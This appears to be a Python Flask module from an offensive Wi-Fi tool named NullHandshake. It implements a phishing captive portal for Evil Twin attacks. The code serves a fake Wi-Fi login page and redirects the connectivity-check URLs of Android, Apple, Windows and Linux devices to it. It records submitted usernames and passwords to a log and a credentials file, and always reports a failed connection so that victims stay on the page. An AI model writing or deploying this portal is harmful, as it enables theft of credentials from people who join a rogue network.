#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
NullHandshake - Phishing Portal

This module implements a captive portal for collecting credentials
during Evil Twin attacks.
"""

import os
import time
import logging
import threading
from datetime import datetime

from flask import (
    Flask, render_template, request, redirect, url_for,
    session, jsonify, abort, make_response
)

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Create Flask app
app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", os.urandom(24).hex())

# Global variables
PORTAL_SSID = "WiFi"
CREDENTIALS_FILE = None
CREDENTIALS = []

@app.route('/')
def index():
    """Main landing page that redirects to login."""
    # Most devices will hit this when checking internet connectivity
    resp = make_response(redirect(url_for('login')))
    resp.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    return resp

@app.route('/login', methods=['GET', 'POST'])
def login():
    """WiFi login page."""
    error = None
    ssid = PORTAL_SSID
    
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        if username and password:
            # Store the credentials
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            credential = {
                'username': username,
                'password': password,
                'timestamp': timestamp
            }
            CREDENTIALS.append(credential)
            
            # Write to file
            if CREDENTIALS_FILE:
                try:
                    with open(CREDENTIALS_FILE, 'a') as f:
                        f.write(f"{username},{password},{timestamp}\n")
                except Exception as e:
                    logger.error(f"Error saving credentials: {str(e)}")
            
            logger.info(f"Captured credentials: {username}:{password}")
            
            # Store in session that this user has "authenticated"
            session['authenticated'] = True
            
            # Redirect to success page
            return redirect(url_for('connecting'))
        else:
            error = "Please enter both username/email and password"
    
    return render_template('login.html', ssid=ssid, error=error)

@app.route('/connecting')
def connecting():
    """
    Show connecting page after login.
    This simulates the network connecting, but always fails.
    """
    ssid = PORTAL_SSID
    return render_template('connecting.html', ssid=ssid)

@app.route('/check-status')
def check_status():
    """API endpoint to check connection status."""
    # Always return failed status to keep user on captive portal
    return jsonify({'status': 'failed', 'message': 'Authentication failed. Please try again.'})

@app.route('/generate_204')
@app.route('/gen_204')
@app.route('/mobile/status.php')
@app.route('/kindle-wifi/wifiredirect.html')
def android_captive_portal():
    """Handle Android captive portal detection."""
    return redirect(url_for('login'))

@app.route('/hotspot-detect.html')
@app.route('/library/test/success.html')
def apple_captive_portal():
    """Handle Apple captive portal detection."""
    return redirect(url_for('login'))

@app.route('/ncsi.txt')
def windows_captive_portal():
    """Handle Windows captive portal detection."""
    return redirect(url_for('login'))

@app.route('/connectivity-check.html')
def linux_captive_portal():
    """Handle Linux captive portal detection."""
    return redirect(url_for('login'))

@app.route('/logout')
def logout():
    """Log the user out and redirect to login page."""
    session.clear()
    return redirect(url_for('login'))

@app.errorhandler(404)
def page_not_found(e):
    """Redirect all 404 errors to the login page."""
    return redirect(url_for('login'))

def run_portal(host='0.0.0.0', port=5000, ssid=None, creds_file=None):
    """
    Run the phishing portal.
    
    Args:
        host (str): Host to bind to
        port (int): Port to listen on
        ssid (str): SSID to display in the portal
        creds_file (str): Path to file where credentials will be saved
    """
    global PORTAL_SSID, CREDENTIALS_FILE
    
    # Set global variables
    if ssid:
        PORTAL_SSID = ssid
    else:
        PORTAL_SSID = os.environ.get('PORTAL_SSID', 'WiFi')
    
    if creds_file:
        CREDENTIALS_FILE = creds_file
    else:
        # Create default credentials file
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        data_dir = os.path.join(base_dir, 'data', 'evil_twin')
        os.makedirs(data_dir, exist_ok=True)
        CREDENTIALS_FILE = os.path.join(data_dir, 'credentials.txt')
    
    logger.info(f"Starting phishing portal on {host}:{port}")
    logger.info(f"Using SSID: {PORTAL_SSID}")
    logger.info(f"Credentials will be saved to: {CREDENTIALS_FILE}")
    
    # Run the app
    app.run(host=host, port=port, debug=True, use_reloader=False)

if __name__ == '__main__':
    run_portal()
